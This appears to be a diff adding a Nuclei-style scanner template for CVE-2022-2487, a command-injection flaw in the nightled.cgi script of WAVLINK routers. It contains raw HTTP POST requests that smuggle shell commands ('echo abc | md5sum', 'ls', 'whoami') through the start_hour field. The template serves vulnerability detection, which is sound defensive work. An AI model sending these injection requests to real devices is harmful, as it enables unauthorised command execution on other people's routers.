@@ -1,0 +1,50 @@
+id: cve-2022-2487
+info:
+  name: wavlink nightled.cgi command execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WAVLINK is a router developed by China Ruiyin Technology (WAVLINK). There is a command execution vulnerability in the system nightled.cgi file, through which an attacker can obtain server privileges. The firmware version is WL-WN535K2/K3, including models WN530HG4, WN531G3, WN572HG3, WN535G3, WN575A4, etc.
+  tags:
+    - iot
+    - command-execution
+  classification:
+    cve-id: CVE-2022-2487
+    cvss-score: 9.8
+
+http:
+  - raw:
+      - |
+        POST /cgi-bin/nightled.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=night_led&start_hour=;echo abc | md5sum;
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "0bee89b07a248e27c83fc3d5951213c1"
+        part: body
+  - raw:
+      - |
+        POST /cgi-bin/nightled.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=night_led&start_hour=;{{cmd}};
+    payloads:
+      cmd:
+        - "ls"
+        - "whoami"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Content-Type:"
